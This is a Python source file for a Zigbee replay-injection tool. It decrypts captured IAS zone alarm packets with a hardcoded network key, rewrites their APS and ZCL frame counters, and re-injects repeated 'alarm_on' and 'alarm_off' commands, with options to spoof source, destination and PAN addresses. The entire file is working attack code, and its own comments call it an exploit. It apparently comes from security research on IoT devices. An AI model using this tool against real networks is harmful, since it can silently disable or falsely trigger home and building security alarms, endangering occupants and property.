# Usage description for docopt
"""
ReplayZCLAlarmScript

Usage: 
    zcl_replay_alarm_script.py [--channel <channel>] [--increment <increment>] [--key <key>] [--trace <pcapfile>] [--sniff ]

Options: 
    -h, --help                 Show this help menu.

    -c, --channel <channel>    Channel to inject [default: 15].
    -i, --increment <increment>Counter increment [default: 10].
    -k, --key <key>            Network key.
    -t, --trace <FILE>         Pcap file to use for replay packets
    --sniff                    Only sniff the network without injecting packets 
"""
import sys
import os
os.chdir(os.path.realpath(os.path.dirname(sys.argv[0])))
sys.path.append("../replay")

from replay_packet import ReplayZigbeePacket


from killerbee.scapy_extensions import *
from scapy.layers.dot15d4 import *
from scapy.layers.zigbee import *
from scapy.utils import *
from docopt import docopt, DocoptExit


# Wireshark filter:zbee_aps.cluster == 0x0500
#zbee_zcl_ias.zone.status
def check_zcl_alarm(pkt, key_net):
    """
    Return True, Decrypted_ZCL_Packet, [frame counters] if packet is a ZCL Alarm Packet
    Otherwise return False, None, [-1, -1]
    """
    d_pktwhole = kbdecrypt(pkt, key_net, 0, True)
    if d_pktwhole is not None:
        d_pkt = d_pktwhole[0]
        if d_pkt is not None and len(d_pkt) == 17:
            raw_decrypted = raw(d_pkt)
            aps_counter = ord(raw_decrypted[7])
            zcl_counter = ord(raw_decrypted[9])
            return True, d_pkt, [aps_counter, zcl_counter]
        else:
            return False, None, [-1, -1]
    else:
        return False, None, [-1, -1]

def set_zclonoff_counters(aps_counter, zcl_counter, decrypted_pkt, module_args):
    """
    Sets the ZCL parameters needed for the exploit : counters and command bytes. 
    """
    #zcl_command = module_args['zcl_command']

    str_decrypted_pkt = raw(decrypted_pkt)
    str_reconstructed_pkt = ""
    index = 0
    for i in str_decrypted_pkt:
        if index != 7 and index != 9 and index < len(str_decrypted_pkt) - 1:
            str_reconstructed_pkt += i
        elif index == 7:
            str_reconstructed_pkt += chr(aps_counter % 255) # Set APS counter
        elif index == 9:
            str_reconstructed_pkt += chr(zcl_counter % 255) # Set ZCL counter
        
        # elif index == 10: # Set Command
        #     str_reconstructed_pkt += zcl_command
        #     index += 1 #Increment index a second time since we write a 2-bytes command
       

        index += 1

    reconstructed_decrypted_pkt = ZigbeeAppDataPayload(str_reconstructed_pkt)
    return reconstructed_decrypted_pkt

class ReplayZCLAlarm:
    def __init__(self):
        self.options = {
            'channel': {
                'Current Settings': '15',
                'Require': True,
                'Description': 'Channel to send [default: 15].'
            },
            'increment': {
                'Current Settings': '10',
                'Require': True,
                'Description': 'Increment to frame counters [default: 10].'
            },
            'default_fc': {
                'Current Settings': '200',
                'Require': True,
                'Description': 'Default frame counter set when previous \
                    is not known [default: 200].'
            },
            'key': {
                'Current Settings': 'f247868f650fa30e2f0d5e1abc341179',
                'Require': True,
                'Description': 'Default frame counter set when previous \
                    is not known [default: 200].'
            },
            'keep_addr': {
                'Current Settings': True,
                'Require': True,
                'Description': 'Keep same addresses for replayed packet'
            },
            'src': {
                'Current Settings': None,
                'Require': False,
                'Description': 'New short address of source (layer 3).'
            },
            'dst': {
                'Current Settings': None,
                'Require': False,
                'Description': 'New short address of destination (layer 3).'
            },
            'src2': {
                'Current Settings': None,
                'Require': False,
                'Description': 'New short address of source (layer 2).'
            },
            'dst2': {
                'Current Settings': None,
                'Require': False,
                'Description': 'New short address of destination (layer 2).'
            },
            'panid': {
                'Current Settings': None,
                'Require': False,
                'Description': 'New PAN ID of the Zigbee Network.'
            },
            'trace': {
                'Current Settings': "alarm.pcapng",
                'Require': True,
                'Description': 'Filename of the .pcap of the packet to replay.'
            },
            'use': {
                'Current Settings': "['alarm_on, alarm_off']",
                'Require': True,
                'Description': 'Describe use of the module for the replayer.'
            }
        }

        # Update args
        global args
        if args['--increment'] is not None:
            self.options['increment']['Current Settings'] = int(args['--increment'])

    def run(self):
        """
        Run the replay with the current settings 

        Usage: run [-h]

        Options:
            -h, --help  print this help menu
        """
        # Initialize replay packet
        conf.dot15d4_protocol = "zigbee"
        r_pkts = rdpcap(self.options['trace']['Current Settings'])

        # Set Zigbee replayer
        replayer = ReplayZigbeePacket()
        
        # Add replay commands (alarm off, alarm on)
        replay_pkts = []
        module_args = []
        for i in range(50):
            replay_pkts.append(r_pkts[0].copy())
            module_args.append([])
        replayer.add_replay_command(replay_pkts, "alarm_off", set_zclonoff_counters, module_args)
        
        replay_pkts = []
        module_args = []
        for i in range(50):
            replay_pkts.append(r_pkts[1].copy())
            module_args.append([])
        replayer.add_replay_command(replay_pkts, "alarm_on", set_zclonoff_counters, module_args)

        # Run ZigBee replayer        
        replayer.run(self.options, check_zcl_alarm, args['--sniff'])

if __name__ == '__main__':  
    
    banner = """
******* Zigbee injection module *******
            
            
* Starting injection
    """

    print(banner)
    version = 0.1    
    global args
    args = docopt(__doc__, version=version)

    # Create module replayer and run
    replayer = ReplayZCLAlarm()
    replayer.run()